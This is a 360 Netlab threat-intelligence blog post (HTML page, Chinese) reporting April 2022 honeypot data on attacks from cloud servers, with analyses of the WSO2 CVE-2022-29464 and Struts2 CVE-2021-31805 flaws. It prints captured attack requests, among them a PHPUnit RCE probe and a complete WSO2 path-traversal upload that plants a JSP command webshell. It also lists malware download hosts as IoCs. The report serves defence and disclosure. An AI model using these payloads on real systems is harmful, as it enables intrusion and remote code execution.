<html lang="en"><head>

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">

    <title>公有云网络安全威胁情报（202204）</title>
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <link rel="stylesheet" type="text/css" href="/assets/built/screen.css?v=649c01aa08">

    <link rel="shortcut icon" href="/favicon.png" type="image/png">
    <link rel="canonical" href="https://blog.netlab.360.com/public-cloud-threat-intelligence-202204/">
    <meta name="referrer" content="no-referrer-when-downgrade">
    <link rel="amphtml" href="https://blog.netlab.360.com/public-cloud-threat-intelligence-202204/amp/">
    
    <meta property="og:site_name" content="360 Netlab Blog - Network Security Research Lab at 360">
    <meta property="og:type" content="article">
    <meta property="og:title" content="公有云网络安全威胁情报（202204）">
    <meta property="og:description" content="概述
> 本文聚焦于云上重点资产的扫描攻击、云服务器总体攻击情况分析、热门漏洞及恶意程序的攻击威胁。
 * 360高级威胁狩猎蜜罐系统 [https://netlab.360.com/zh/honeypot]
   发现全球9.2万个云服务器IP进行网络扫描、漏洞攻击、传播恶意软件等行为。其中包括国内39家单位所属的云服务资产IP，这些单位涉及政府、医疗、建筑、军工等多个行业。
 * 2022年4月，WSO2多个产品和Apache
   Struts2爆出高危漏洞，两个漏洞技术细节已经公开，并且我们发现两个漏洞都已有在野利用和利用漏洞传播恶意软件的行为。
 * 本月共记录来源于云服务器的扫描和攻击会话3.7亿次，其中漏洞攻击会话2400万次，传播恶意软件会话77.2万次。

云上重点资产扫描攻击
> 四月份，我们共监测到全国39个公有云重点资产存在异常扫描及攻击行为。
随着云服务的普及，云安全问题也随之越发突出。攻击者常常入侵云服务器，并利用被入侵机器继续发动攻击。4月份我们发现了国内39个云服务器重点IP具有异常扫描攻击行为，由此我们认为该重点IP可能被入侵。从行业分布看，事业单位和">
    <meta property="og:url" content="https://blog.netlab.360.com/public-cloud-threat-intelligence-202204/">
    <meta property="article:published_time" content="2022-05-11T02:53:55.000Z">
    <meta property="article:modified_time" content="2022-05-11T02:53:55.000Z">
    <meta property="article:tag" content="公有云威胁情报">
    <meta property="article:tag" content="Anglerfish">
    <meta property="article:tag" content="Anglerfish Honeypot">
    
    <meta name="twitter:card" content="summary">
    <meta name="twitter:title" content="公有云网络安全威胁情报（202204）">
    <meta name="twitter:description" content="概述
> 本文聚焦于云上重点资产的扫描攻击、云服务器总体攻击情况分析、热门漏洞及恶意程序的攻击威胁。
 * 360高级威胁狩猎蜜罐系统 [https://netlab.360.com/zh/honeypot]
   发现全球9.2万个云服务器IP进行网络扫描、漏洞攻击、传播恶意软件等行为。其中包括国内39家单位所属的云服务资产IP，这些单位涉及政府、医疗、建筑、军工等多个行业。
 * 2022年4月，WSO2多个产品和Apache
   Struts2爆出高危漏洞，两个漏洞技术细节已经公开，并且我们发现两个漏洞都已有在野利用和利用漏洞传播恶意软件的行为。
 * 本月共记录来源于云服务器的扫描和攻击会话3.7亿次，其中漏洞攻击会话2400万次，传播恶意软件会话77.2万次。

云上重点资产扫描攻击
> 四月份，我们共监测到全国39个公有云重点资产存在异常扫描及攻击行为。
随着云服务的普及，云安全问题也随之越发突出。攻击者常常入侵云服务器，并利用被入侵机器继续发动攻击。4月份我们发现了国内39个云服务器重点IP具有异常扫描攻击行为，由此我们认为该重点IP可能被入侵。从行业分布看，事业单位和">
    <meta name="twitter:url" content="https://blog.netlab.360.com/public-cloud-threat-intelligence-202204/">
    <meta name="twitter:label1" content="Written by">
    <meta name="twitter:data1" content="360Netlab">
    <meta name="twitter:label2" content="Filed under">
    <meta name="twitter:data2" content="公有云威胁情报, Anglerfish, Anglerfish Honeypot">
    <meta name="twitter:site" content="@360Netlab">
    
    <script async="" src="https://www.google-analytics.com/analytics.js"></script><script type="application/ld+json">
{
    "@context": "https://schema.org",
    "@type": "Article",
    "publisher": {
        "@type": "Organization",
        "name": "360 Netlab Blog - Network Security Research Lab at 360",
        "logo": "https://blog.netlab.360.com/content/images/2019/02/netlab-brand-5.png"
    },
    "author": {
        "@type": "Person",
        "name": "360Netlab",
        "url": "https://blog.netlab.360.com/author/360netlab/",
        "sameAs": [
            "https://netlab.360.com"
        ]
    },
    "headline": "公有云网络安全威胁情报（202204）",
    "url": "https://blog.netlab.360.com/public-cloud-threat-intelligence-202204/",
    "datePublished": "2022-05-11T02:53:55.000Z",
    "dateModified": "2022-05-11T02:53:55.000Z",
    "keywords": "公有云威胁情报, Anglerfish, Anglerfish Honeypot",
    "description": "概述\n&gt; 本文聚焦于云上重点资产的扫描攻击、云服务器总体攻击情况分析、热门漏洞及恶意程序的攻击威胁。\n * 360高级威胁狩猎蜜罐系统 [https://netlab.360.com/zh/honeypot]\n   发现全球9.2万个云服务器IP进行网络扫描、漏洞攻击、传播恶意软件等行为。其中包括国内39家单位所属的云服务资产IP，这些单位涉及政府、医疗、建筑、军工等多个行业。\n * 2022年4月，WSO2多个产品和Apache\n   Struts2爆出高危漏洞，两个漏洞技术细节已经公开，并且我们发现两个漏洞都已有在野利用和利用漏洞传播恶意软件的行为。\n * 本月共记录来源于云服务器的扫描和攻击会话3.7亿次，其中漏洞攻击会话2400万次，传播恶意软件会话77.2万次。\n\n云上重点资产扫描攻击\n&gt; 四月份，我们共监测到全国39个公有云重点资产存在异常扫描及攻击行为。\n随着云服务的普及，云安全问题也随之越发突出。攻击者常常入侵云服务器，并利用被入侵机器继续发动攻击。4月份我们发现了国内39个云服务器重点IP具有异常扫描攻击行为，由此我们认为该重点IP可能被入侵。从行业分布看，事业单位和",
    "mainEntityOfPage": {
        "@type": "WebPage",
        "@id": "https://blog.netlab.360.com/"
    }
}
    </script>

    <script src="/public/ghost-sdk.min.js?v=649c01aa08"></script>
<script>
ghost.init({
	clientId: "ghost-frontend",
	clientSecret: "2a7213b591a9"
});
</script>
    <meta name="generator" content="Ghost 2.13">
    <link rel="alternate" type="application/rss+xml" title="360 Netlab Blog - Network Security Research Lab at 360" href="https://blog.netlab.360.com/rss/">
    
<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-83587830-1', 'auto');
  ga('send', 'pageview');

</script>

<!-- Fix first paragraph font size -->
<style type="text/css">
 .post-template .post-content > p:first-child {font-size: 1em;}
</style>

<script src="https://blog-netlab-360.disqus.com/embed.js" data-timestamp="1652239022917"></script><style id="fit-vids-style">.fluid-width-video-container{flex-grow: 1;width:100%;}.fluid-width-video-wrapper{width:100%;position:relative;padding:0;}.fluid-width-video-wrapper iframe,.fluid-width-video-wrapper object,.fluid-width-video-wrapper embed {position:absolute;top:0;left:0;width:100%;height:100%;}</style><link rel="prefetch" as="style" href="https://c.disquscdn.com/next/embed/styles/lounge.63860eb743c7d9d2adf0fa435788abe7.css"><link rel="prefetch" as="script" href="https://c.disquscdn.com/next/embed/common.bundle.33bc87b2c4f9324203cc85b7dd1d0492.js"><link rel="prefetch" as="script" href="https://c.disquscdn.com/next/embed/lounge.bundle.275044d1ea778800bd83f8337ba3d84e.js"><link rel="prefetch" as="script" href="https://disqus.com/next/config.js"><script src="https://c.disquscdn.com/next/embed/alfie_v4.63f1ab6d6b9d5807dc0c94ef3fe0b851.js" async="" charset="UTF-8"></script></head>
<body class="post-template tag-gong-you-yun-wei-xie-qing-bao tag-anglerfish tag-anglerfish-honeypot">

    <div class="site-wrapper">

             <header class="site-header outer">
    <div class="inner">
        <nav class="site-nav">
    <div class="site-nav-left">
                <a class="site-nav-logo" href="https://blog.netlab.360.com"><img src="https://blog.netlab.360.com/content/images/2019/02/netlab-brand-5.png" alt="360 Netlab Blog - Network Security Research Lab at 360"></a>
            <ul class="nav" role="menu">
    <li class="nav-botnet" role="menuitem"><a href="https://blog.netlab.360.com/tag/botnet/">Botnet</a></li>
    <li class="nav-dnsmon" role="menuitem"><a href="https://blog.netlab.360.com/tag/dnsmon/">DNSMon</a></li>
    <li class="nav-ddos" role="menuitem"><a href="https://blog.netlab.360.com/tag/ddos/">DDoS</a></li>
    <li class="nav-passivedns" role="menuitem"><a href="https://blog.netlab.360.com/tag/pdns/">PassiveDNS</a></li>
    <li class="nav-mirai" role="menuitem"><a href="https://blog.netlab.360.com/tag/mirai/">Mirai</a></li>
    <li class="nav-dta" role="menuitem"><a href="https://blog.netlab.360.com/tag/dta/">DTA</a></li>
</ul>

    </div>
    <div class="site-nav-right">
        <div class="social-links">
                <a class="social-link social-link-tw" href="https://twitter.com/360Netlab" title="Twitter" target="_blank" rel="noopener"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path d="M30.063 7.313c-.813 1.125-1.75 2.125-2.875 2.938v.75c0 1.563-.188 3.125-.688 4.625a15.088 15.088 0 0 1-2.063 4.438c-.875 1.438-2 2.688-3.25 3.813a15.015 15.015 0 0 1-4.625 2.563c-1.813.688-3.75 1-5.75 1-3.25 0-6.188-.875-8.875-2.625.438.063.875.125 1.375.125 2.688 0 5.063-.875 7.188-2.5-1.25 0-2.375-.375-3.375-1.125s-1.688-1.688-2.063-2.875c.438.063.813.125 1.125.125.5 0 1-.063 1.5-.25-1.313-.25-2.438-.938-3.313-1.938a5.673 5.673 0 0 1-1.313-3.688v-.063c.813.438 1.688.688 2.625.688a5.228 5.228 0 0 1-1.875-2c-.5-.875-.688-1.813-.688-2.75 0-1.063.25-2.063.75-2.938 1.438 1.75 3.188 3.188 5.25 4.25s4.313 1.688 6.688 1.813a5.579 5.579 0 0 1 1.5-5.438c1.125-1.125 2.5-1.688 4.125-1.688s3.063.625 4.188 1.813a11.48 11.48 0 0 0 3.688-1.375c-.438 1.375-1.313 2.438-2.563 3.188 1.125-.125 2.188-.438 3.313-.875z"></path></svg>
</a>
        </div>
            <a class="rss-button" href="https://feedly.com/i/subscription/feed/https://blog.netlab.360.com/rss/" title="RSS" target="_blank" rel="noopener"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><circle cx="6.18" cy="17.82" r="2.18"></circle><path d="M4 4.44v2.83c7.03 0 12.73 5.7 12.73 12.73h2.83c0-8.59-6.97-15.56-15.56-15.56zm0 5.66v2.83c3.9 0 7.07 3.17 7.07 7.07h2.83c0-5.47-4.43-9.9-9.9-9.9z"></path></svg>
</a>
    </div>
</nav>
    </div>
    </header>


    <main id="site-main" class="site-main outer">
        <div class="inner">

            <article class="post-full post tag-gong-you-yun-wei-xie-qing-bao tag-anglerfish tag-anglerfish-honeypot no-image">

                <header class="post-full-header">
                    <section class="post-full-meta">
                        <time class="post-full-meta-date" datetime="2022-05-11">11 May                            2022</time>
                        <span class="date-divider">/</span> <a href="/tag/gong-you-yun-wei-xie-qing-bao/">公有云威胁情报</a>
                    </section>
                    <h1 class="post-full-title">公有云网络安全威胁情报（202204）</h1>
                </header>


                <section class="post-full-content">
                    <div class="post-content">
                        <h2 id="">概述</h2>
<blockquote>本文聚焦于云上重点资产的扫描攻击、云服务器总体攻击情况分析、热门漏洞及恶意程序的攻击威胁。</blockquote><ul>
<li><a href="https://netlab.360.com/zh/honeypot">360高级威胁狩猎蜜罐系统</a>发现全球9.2万个云服务器IP进行网络扫描、漏洞攻击、传播恶意软件等行为。其中包括国内39家单位所属的云服务资产IP，这些单位涉及政府、医疗、建筑、军工等多个行业。</li>
<li>2022年4月，WSO2多个产品和Apache Struts2爆出高危漏洞，两个漏洞技术细节已经公开，并且我们发现两个漏洞都已有在野利用和利用漏洞传播恶意软件的行为。</li>
<li>本月共记录来源于云服务器的扫描和攻击会话3.7亿次，其中漏洞攻击会话2400万次，传播恶意软件会话77.2万次。</li>
</ul>
<h2 id="">云上重点资产扫描攻击</h2>
<blockquote>四月份，我们共监测到全国39个公有云重点资产存在异常扫描及攻击行为。</blockquote><p>随着云服务的普及，云安全问题也随之越发突出。攻击者常常入侵云服务器，并利用被入侵机器继续发动攻击。4月份我们发现了国内39个云服务器重点IP具有异常扫描攻击行为，由此我们认为该重点IP可能被入侵。从行业分布看，事业单位和政府机关的云上资产安全风险问题较大，此外，金融业和央企也面临较为严重的安全威胁。<br>
<a href="https://blog.netlab.360.com/content/images/2022/05/image-20220505111047574.png"><img src="https://blog.netlab.360.com/content/images/2022/05/image-20220505111047574.png" class="kg-image"></a></p>
<p>从云服务商分布情况来看，阿里云在政企市场占据了较大的市场份额，因此也更加容易面临威胁，此次出现扫描攻击的重点IP云服务商以阿里云为主。<br>
<a href="https://blog.netlab.360.com/content/images/2022/05/image-20220509171659966.png"><img src="https://blog.netlab.360.com/content/images/2022/05/image-20220509171659966.png" class="kg-image"></a></p>
<p>这些重点IP主要使用了敏感文件嗅探、Redis的相关漏洞及SSH暴力破解等攻击手法。<br>
<a href="https://blog.netlab.360.com/content/images/2022/05/image-20220509180556394.png"><img src="https://blog.netlab.360.com/content/images/2022/05/image-20220509180556394.png" class="kg-image"></a></p>
<p>下面介绍其中几个具体案例。</p>
<table>
<thead>
<tr>
<th style="text-align:center">IP地址</th>
<th style="text-align:center">云服务商</th>
<th style="text-align:center">单位名称</th>
<th style="text-align:center">行业</th>
<th style="text-align:center">IP所在省份</th>
<th style="text-align:center">漏洞利用列表</th>
<th style="text-align:center">扫描协议列表</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">123.56.*.*</td>
<td style="text-align:center">阿里云</td>
<td style="text-align:center">***人民医院</td>
<td style="text-align:center">医疗</td>
<td style="text-align:center">北京</td>
<td style="text-align:center">Redis未授权访问漏洞<br>Docker API版本信息泄露漏洞</td>
<td style="text-align:center">Redis, HTTP</td>
</tr>
<tr>
<td style="text-align:center">120.92.*.*</td>
<td style="text-align:center">金山云</td>
<td style="text-align:center">****集团有限公司</td>
<td style="text-align:center">建筑/大型央企</td>
<td style="text-align:center">北京</td>
<td style="text-align:center">Apache Tomcat暴力破解<br>PHPUnit 远程代码执行漏洞<br>ThinkPHP 远程代码执行漏洞等</td>
<td style="text-align:center">HTTP</td>
</tr>
<tr>
<td style="text-align:center">121.40.*.*</td>
<td style="text-align:center">阿里云</td>
<td style="text-align:center">****股份有限公司</td>
<td style="text-align:center">制造业/军工</td>
<td style="text-align:center">浙江</td>
<td style="text-align:center">MSSQL暴力破解</td>
<td style="text-align:center">TDS</td>
</tr>
</tbody>
</table>
<p>案例1：位于北京的IP地址为123.56.*.*的阿里云服务器属于某地人民医院，这个IP地址存在利用Redis和Docker漏洞的攻击行为：</p>
<pre><code>*1
$4
info
</code></pre>
<pre><code>GET /v1.16/version HTTP/1.1
Host: {target}
User-Agent: Mozilla/5.0 zgrab/0.x
Accept: */*
Accept-Encoding: gzip 
</code></pre>
<p>案例2：位于北京的IP地址为120.92.*.*的金山云服务器属于某建筑行业大型央企集团有限公司，这个IP地址有Apache Tomcat、PHPUnit和ThinkPHP等多个产品的暴力破解和漏洞利用行为：</p>
<pre><code>GET /manager/html HTTP/1.1
Host: {target}:8081
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Authorization: Basic OGhZVFNVRms6OGhZVFNVRms=
Connection: close
Accept-Encoding: gzip
Connection: close 
</code></pre>
<pre><code>POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1
Host: {target}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0
Content-Length: 52
Accept: */*
Accept-Language: en-US,en;q=0.5
Connection: close
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
Connection: close

&lt;?=md5('eziqkjph');echo strtoupper(php_uname('s'))?&gt;
</code></pre>
<h2 id="">热门漏洞攻击</h2>
<blockquote>2022年4月12日，Apache发布Apache Struts2 高危漏洞(CVE-2021-31805)，该漏洞可允许攻击者发起远程代码执行。攻击者已利用该漏洞传播Shellbot恶意软件。同月18日，WSO2公开高危漏洞CVE-2022-29464，该漏洞允许攻击者在WSO2的多个产品上无限制地上传任意文件。我们发现攻击者已利用该漏洞传播WebShell恶意软件。</blockquote><h3 id="1wso2cve202229464">（1）WSO2 多产品无限制文件上传漏洞(CVE-2022-29464)</h3>
<h4 id="">漏洞信息</h4>
<p><strong>影响范围：</strong><br>
WSO2 API Manager 2.2.0~4.0.0<br>
WSO2 Identity Server 5.2.0~5.11.0<br>
WSO2 Identity Server Analytics 5.4.0, 5.4.1, 5.5.0, 5.6.0<br>
WSO2 Identity Server as Key Manager 5.3.0~5.11.0<br>
WSO2 Enterprise Integrator 6.2.0~6.6.0<br>
WSO2 Open Banking AM 1.4.0~2.0.0<br>
WSO2 Open Banking KM 1.4.0~2.0.0</p>
<p><strong>CVE编号：</strong> CVE-2022-29464<br>
<strong>披露日期：</strong> 2022.04.18<br>
<strong>CVSS 3.1评分：</strong> 9.8<br>
<strong>影响设备量级：</strong> 万级</p>
<p>2022年4月23日，蜜罐系统首次捕获利用该漏洞进行攻击的数据包。我们发现总体上随时间推移，尝试利用该漏洞的攻击者IP数量和攻击会话数量呈现增加趋势。2022年4月28日开始，攻击者开始利用漏洞传播Webshell恶意软件。<br>
<a href="https://blog.netlab.360.com/content/images/2022/05/image-20220505162830059.png"><img src="https://blog.netlab.360.com/content/images/2022/05/image-20220505162830059.png" class="kg-image"></a></p>
<p>WSO2已公布漏洞详情及修补措施，<a href="https://docs.wso2.com/display/Security/Security+Advisory+WSO2-2021-1738">点击查看</a>，我们也对该漏洞的利用方法进行了分析：</p>
<h4 id="payload">漏洞Payload</h4>
<pre><code>POST /fileupload/toolsAny HTTP/1.1
Host: x.x.x.x:9443
User-Agent: python-requests/2.27.1
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Content-Length: 881
Content-Type: multipart/form-data; boundary=256c5115fcd40ad6d0bf6a5ec73018cc

--256c5115fcd40ad6d0bf6a5ec73018cc
Content-Disposition: form-data; name="../../../../repository/deployment/server/webapps/authenticationendpoint/miori.jsp"; filename="../../../../repository/deployment/server/webapps/authenticationendpoint/miori.jsp"

&lt;FORM&gt;
    &lt;INPUT name='cmd' type=text&gt;
    &lt;INPUT type=submit value='Run'&gt;
&lt;/FORM&gt;
&lt;%@ page import="java.io.*" %&gt;
    &lt;%
    String cmd = request.getParameter("cmd");
    String output = "";
    if(cmd != null) {
        String s = null;
        try {
            Process p = Runtime.getRuntime().exec(cmd,null,null);
            BufferedReader sI = new BufferedReader(new
InputStreamReader(p.getInputStream()));
            while((s = sI.readLine()) != null) { output += s+"&lt;/br&gt;"; }
        }  catch(IOException e) {   e.printStackTrace();   }
    }
%&gt;
        &lt;pre&gt;&lt;%=output %&gt;&lt;/pre&gt;
--256c5115fcd40ad6d0bf6a5ec73018cc--
</code></pre>
<h4 id="">漏洞分析</h4>
<p>漏洞接口为/fileupload，搜索接口配置信息，该接口未进行认证处理：<br>
<a href="https://blog.netlab.360.com/content/images/2022/05/image-20220504112812992-16517467119031.png"><img src="https://blog.netlab.360.com/content/images/2022/05/image-20220504112812992-16517467119031.png" class="kg-image"></a><br>
从url的映射配置文件看，漏洞接口/fileupload/toolsAny对应的处理文件是org.wso2.carbon.ui.transports.fileupload.ToolsAnyFileUploadExecutor：<br>
<a href="https://blog.netlab.360.com/content/images/2022/05/image-20220504114744485-16517467175532.png"><img src="https://blog.netlab.360.com/content/images/2022/05/image-20220504114744485-16517467175532.png" class="kg-image"></a><br>
在ToolsAnyFileUploadExecutor类的execute处理函数设置断点，发送蜜罐系统捕获的payload数据：<br>
<a href="https://blog.netlab.360.com/content/images/2022/05/image-20220504121923679-16517467261333.png"><img src="https://blog.netlab.360.com/content/images/2022/05/image-20220504121923679-16517467261333.png" class="kg-image"></a><br>
处理函数并没有对用户输入的上传文件名进行校验存在路径穿越漏洞，从而可以上传webshell到/webapps/目录，导致RCE：<br>
<a href="https://blog.netlab.360.com/content/images/2022/05/image-20220504123925299-16517467465076.png"><img src="https://blog.netlab.360.com/content/images/2022/05/image-20220504123925299-16517467465076.png" class="kg-image"></a></p>
<h4 id="">漏洞修复</h4>
<p>在新版本中，ToolsAnyFileUploadExecutor的函数execute被弃用，直接返回false：<br>
<a href="https://blog.netlab.360.com/content/images/2022/05/image-20220504123404824-16517467412775.png"><img src="https://blog.netlab.360.com/content/images/2022/05/image-20220504123404824-16517467412775.png" class="kg-image"></a><br>
<a href="https://blog.netlab.360.com/content/images/2022/05/image-20220504123221113-16517467349364.png"><img src="https://blog.netlab.360.com/content/images/2022/05/image-20220504123221113-16517467349364.png" class="kg-image"></a></p>
<h3 id="2apachestruts2s2062cve202131805">(2) Apache Struts2 S2-062 远程代码执行漏洞(CVE-2021-31805)</h3>
<h4 id="">漏洞信息</h4>
<p><strong>影响范围：</strong> Apache Struts 2.0.0 - 2.5.29<br>
<strong>CVE编号：</strong> CVE-2021-31805<br>
<strong>公开日期：</strong> 2022.04.12<br>
<strong>CVSS 3.1评分：</strong> 9.8<br>
<strong>影响设备量级：</strong> 百万级</p>
<p>这个漏洞的CVE号年份虽然是2021年，但2022年4月才对外公开。蜜罐系统最早在2022年4月15日捕获到攻击者利用该漏洞发起的攻击，4月16日发现Shellbot恶意程序开始利用该漏洞传播。</p>
<h4 id="">漏洞分析</h4>
<p>官方通报看S2-062是S2-061补丁的修复不完整导致的，仍有标签的属性可导致二次OGNL表达式注入漏洞。ComponentTagSupport的doStartTag 函数开始标签解析，跟踪调试，进入ComponentTagSupport的doEndTag函数：<br>
<a href="https://blog.netlab.360.com/content/images/2022/05/image-20220504135602369-16517485285167.png"><img src="https://blog.netlab.360.com/content/images/2022/05/image-20220504135602369-16517485285167.png" class="kg-image"></a><br>
跟入component.end，接着进入evaluateParams函数，在evaluateParams函数中对name进行标签值赋值：<br>
<a href="https://blog.netlab.360.com/content/images/2022/05/image-20220504163547883-16517485352728.png"><img src="https://blog.netlab.360.com/content/images/2022/05/image-20220504163547883-16517485352728.png" class="kg-image"></a><br>
继续调试，当标签属性不包含value且name非空时，进入completeExpressionIfAltSyntax 函数：<br>
<a href="https://blog.netlab.360.com/content/images/2022/05/image-20220504163937298-16517485412929.png"><img src="https://blog.netlab.360.com/content/images/2022/05/image-20220504163937298-16517485412929.png" class="kg-image"></a><br>
跟进completeExpressionIfAltSyntax 函数，输入的name值 2*16 将被修改为%{2*16}：<br>
<a href="https://blog.netlab.360.com/content/images/2022/05/image-20220504164049163-165174854582610.png"><img src="https://blog.netlab.360.com/content/images/2022/05/image-20220504164049163-165174854582610.png" class="kg-image"></a></p>
<p>然后recursion函数返回false，从而进入findValue触发二次OGNL表达式注入，执行了%{2*16}表达式：<br>
<a href="https://blog.netlab.360.com/content/images/2022/05/image-20220504164620635-165174855049011.png"><img src="https://blog.netlab.360.com/content/images/2022/05/image-20220504164620635-165174855049011.png" class="kg-image"></a><br>
在Struts v2.5.26中org.apache.tomcat被加入黑名单，根据OGNL语法，可通过#@org.apache.commons.collections.BeanMap@{}获取BeanMap对象，从而绕过S2_061的补丁。</p>
<h4 id="">漏洞修复</h4>
<p>在Struts v2.5.30版本中，新增isAcceptableExpression函数，通过正则表达式判断的方式修补漏洞：</p>
<p><a href="https://blog.netlab.360.com/content/images/2022/05/image-20220504172557824-165174855462412.png"><img src="https://blog.netlab.360.com/content/images/2022/05/image-20220504172557824-165174855462412.png" class="kg-image"></a><br>
<a href="https://blog.netlab.360.com/content/images/2022/05/image-20220504173327346-165174855870213.png"><img src="https://blog.netlab.360.com/content/images/2022/05/image-20220504173327346-165174855870213.png" class="kg-image"></a></p>
<h2 id="">云服务器攻击总体情况</h2>
<blockquote>4月份共监测到全球9.2万个访问蜜罐节点的服务器，其中2.4万个IP发生漏洞扫描和攻击行为，超6000个IP发生恶意软件传播行为，1.1万个IP发生密码爆破行为。</blockquote><p>四月份我们共捕获到来自云服务器的扫描和攻击威胁3.67亿次。其中，进行漏洞扫描和攻击事件2400万次，共涉及386个漏洞，暴力破解事件2200万次，传播恶意软件事件77.2万次，涉及恶意软件家族236个。<br>
阿里云、DigitalOcean和腾讯云是发起漏洞攻击的IP数量最多的三家云服务商。</p>
<p><a href="https://blog.netlab.360.com/content/images/2022/05/image-20220505115608134.png"><img src="https://blog.netlab.360.com/content/images/2022/05/image-20220505115608134.png" class="kg-image"></a></p>
<p>总体上，攻击者通常使用暴力破解、漏洞探测和扫描、远程代码执行漏洞等方法发起网络攻击。<br>
<a href="https://blog.netlab.360.com/content/images/2022/05/image-20220506104155557.png"><img src="https://blog.netlab.360.com/content/images/2022/05/image-20220506104155557.png" class="kg-image"></a></p>
<p>在具体的攻击方法上，Redis相关漏洞、敏感文件嗅探和SMTP协议扫描等是攻击者最常用的攻击手段。<br>
<a href="https://blog.netlab.360.com/content/images/2022/05/image-20220506134605931.png"><img src="https://blog.netlab.360.com/content/images/2022/05/image-20220506134605931.png" class="kg-image"></a><br>
从漏洞攻击针对的厂商和产品分析，Redis、Docker和Apache仍然是攻击者使用漏洞攻击最多的厂商/产品，其中Redis的攻击者数量变化不大，但Docker的攻击者数量较三月有比较明显的提升。<br>
<a href="https://blog.netlab.360.com/content/images/2022/05/image-20220509192246030.png"><img src="https://blog.netlab.360.com/content/images/2022/05/image-20220509192246030.png" class="kg-image"></a><br>
一些攻击者利用漏洞攻击的同时，还会传播木马病毒等恶意软件以达到挖矿、控制等目的。4月份共捕获到利用云服务器传播的恶意软件样本5350个，日均传播恶意软件会话2.57万次。在利用漏洞传播的恶意样本中，挖矿类（CoinMiner）的传播IP数量和会话数量最多，此外，木马下载器类（TrojanDownloader）、黑客工具类（HackTool）、Tsunami僵尸网络等也是传播较多的恶意软件家族类型。<br>
<a href="https://blog.netlab.360.com/content/images/2022/05/image-20220510164811165.png"><img src="https://blog.netlab.360.com/content/images/2022/05/image-20220510164811165.png" class="kg-image"></a></p>
<p>具体来看，全球云服务器传播恶意软件会话日均34.4万次，传播恶意软件文件数量超过5000个，传播会话以挖矿类（CoinMiner）、Mirai僵尸网络程序和Root工具类（Rootkit）为主，主要恶意软件传播数据如下表所示：</p>
<table>
<thead>
<tr>
<th>恶意软件家族</th>
<th>恶意软件样本数量</th>
<th>恶意软件传播会话数量</th>
</tr>
</thead>
<tbody>
<tr>
<td>CoinMiner</td>
<td>132</td>
<td>3492059</td>
</tr>
<tr>
<td>Mirai</td>
<td>3528</td>
<td>2225752</td>
</tr>
<tr>
<td>Rootkit</td>
<td>8</td>
<td>1293556</td>
</tr>
<tr>
<td>Gafgyt</td>
<td>858</td>
<td>1199324</td>
</tr>
<tr>
<td>TrojanDownloader</td>
<td>446</td>
<td>764117</td>
</tr>
<tr>
<td>HackTool</td>
<td>9</td>
<td>338871</td>
</tr>
<tr>
<td>Tsunami</td>
<td>28</td>
<td>266909</td>
</tr>
<tr>
<td>YellowDye</td>
<td>8</td>
<td>265361</td>
</tr>
<tr>
<td>RemoteAdmin</td>
<td>1</td>
<td>259459</td>
</tr>
<tr>
<td>Exploit</td>
<td>46</td>
<td>28327</td>
</tr>
</tbody>
</table>
<p>中国国内云服务器传播恶意软件会话日均19.5万次，传播恶意软件文件数量770个，传播会话以挖矿类（CoinMiner）、Root工具类（Rootkit）和木马下载器类（TrojanDownloader）为主，主要恶意软件传播数据如下表所示：</p>
<table>
<thead>
<tr>
<th>恶意软件家族</th>
<th>恶意软件样本数量</th>
<th>恶意软件传播会话数量</th>
</tr>
</thead>
<tbody>
<tr>
<td>CoinMiner</td>
<td>57</td>
<td>3107750</td>
</tr>
<tr>
<td>Rootkit</td>
<td>8</td>
<td>1135539</td>
</tr>
<tr>
<td>TrojanDownloader</td>
<td>49</td>
<td>495456</td>
</tr>
<tr>
<td>HackTool</td>
<td>5</td>
<td>303781</td>
</tr>
<tr>
<td>YellowDye</td>
<td>8</td>
<td>233292</td>
</tr>
<tr>
<td>RemoteAdmin</td>
<td>1</td>
<td>232013</td>
</tr>
<tr>
<td>Tsunami</td>
<td>12</td>
<td>228386</td>
</tr>
<tr>
<td>Mirai</td>
<td>500</td>
<td>101470</td>
</tr>
<tr>
<td>Exploit</td>
<td>19</td>
<td>4921</td>
</tr>
<tr>
<td>Kryptik</td>
<td>3</td>
<td>666</td>
</tr>
</tbody>
</table>
<p>我们从攻击者下载恶意软件的URL中提取出了这些恶意软件下载服务器的域名或IP，被最多攻击者使用的恶意软件下载服务器有oracle.zzhreceive.top，bbq.zzhreceive.top等。<br>
<a href="https://blog.netlab.360.com/content/images/2022/05/image-20220506114703626.png"><img src="https://blog.netlab.360.com/content/images/2022/05/image-20220506114703626.png" class="kg-image"></a><br>
密码爆破攻击方面，SSH的暴力破解仍然最为常见，随后是Telnet和甲骨文公司的Oracle TNS协议。DigitalOcean、腾讯云和亚马逊AWS是爆破攻击源IP数量最多的云服务商。<br>
<a href="https://blog.netlab.360.com/content/images/2022/05/image-20220506141358361.png"><img src="https://blog.netlab.360.com/content/images/2022/05/image-20220506141358361.png" class="kg-image"></a></p>
<h2 id="">联系我们</h2>
<p>感兴趣的读者，可以在 <a href="https://twitter.com/360Netlab"><strong>twitter</strong></a> 或者通过邮件<strong>netlab[at]360.cn</strong>联系我们。</p>
<h2 id="ioclist">IoC List</h2>
<p>URL：</p>
<pre><code><a class="vglnk" href="http://146.70.80.113/suite" rel="nofollow"><span>http</span><span>://</span><span>146</span><span>.</span><span>70</span><span>.</span><span>80</span><span>.</span><span>113</span><span>/</span><span>suite</span></a>
